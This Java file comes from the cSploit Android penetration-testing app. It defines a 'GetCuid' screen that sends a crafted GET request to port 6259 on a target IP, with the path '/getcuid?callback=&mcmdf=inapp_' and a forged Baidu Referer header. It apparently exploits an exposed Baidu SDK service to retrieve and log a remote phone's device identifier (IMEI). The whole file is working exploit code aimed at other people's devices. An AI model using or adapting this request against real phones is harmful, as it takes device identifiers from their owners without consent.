package org.csploit.android.bdcmdlist;

import android.content.SharedPreferences;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.support.v7.app.ActionBarActivity;
import android.util.Log;
import android.widget.TextView;

import org.csploit.android.R;

import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.Reader;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.URL;

/**
 * Created by heeeeen on 15/5/21.
 */
public class GetCuid extends ActionBarActivity {

    private TextView mResultView = null;
    private String mRequestUrl = null;
    private String mResult = null;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        SharedPreferences themePrefs = getSharedPreferences("THEME", 0);
        Boolean isDark = themePrefs.getBoolean("isDark", false);

        if (isDark)
            setTheme(R.style.DarkTheme);
        else
            setTheme(R.style.AppTheme);

        setContentView(R.layout.getcuid_layout);
        String target = getIntent().getStringExtra("targetIP");
        setTitle("exlp0it > "+ target + " > getcuid");
        mRequestUrl = "http://" + target + ":6259/getcuid?" + "callback=&mcmdf=inapp_";
        mResultView = (TextView) findViewById(R.id.cuid);
        mResultView.setTextSize(22);
        final Handler handler = new Handler() {
            @Override
            public void handleMessage(Message msg) {
                if(msg.what == 0x01){
                    mResultView.setText(mResult);
                }
            }

        };



        new Thread() {
            @Override
            public void run() {
                try {
                    mResult = getcuidinfo(mRequestUrl);
                    Log.d("heen", "IMEI is =" + mResult);
                    handler.sendEmptyMessage(0x01);  //finished
                } catch (Exception e) {

                }

            }
        }.start();
    }

    // Given a URL, establishes an HttpUrlConnection and retrieves
    // the web page content as a InputStream, which it returns as
    // a string.
    private String getcuidinfo(String myurl) throws IOException {
        InputStream is = null;
        // Only display the first 500 characters of the retrieved
        // web page content.
        int len = 500;

        try {
            URL url = new URL(myurl);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setReadTimeout(1000 /* milliseconds */);
            conn.setConnectTimeout(1500 /* milliseconds */);
            conn.setRequestMethod("GET");
            conn.setRequestProperty("Referer", "http://www.baidu.com");
            conn.setDoInput(true);
            // Starts the query
            conn.connect();
            int response = conn.getResponseCode();
            Log.d("heen", "The response is: " + response);
            is = conn.getInputStream();

            // Convert the InputStream into a string
            String contentAsString = readIt(is, len);
            return contentAsString;

            // Makes sure that the InputStream is closed after the app is
            // finished using it.
        } finally {
            if (is != null) {
                is.close();
            }
        }
    }

    // Reads an InputStream and converts it to a String.
    public String readIt(InputStream stream, int len) throws IOException, UnsupportedEncodingException {
        Reader reader = null;
        reader = new InputStreamReader(stream, "UTF-8");
        char[] buffer = new char[len];
        reader.read(buffer);
        return new String(buffer);
    }

}
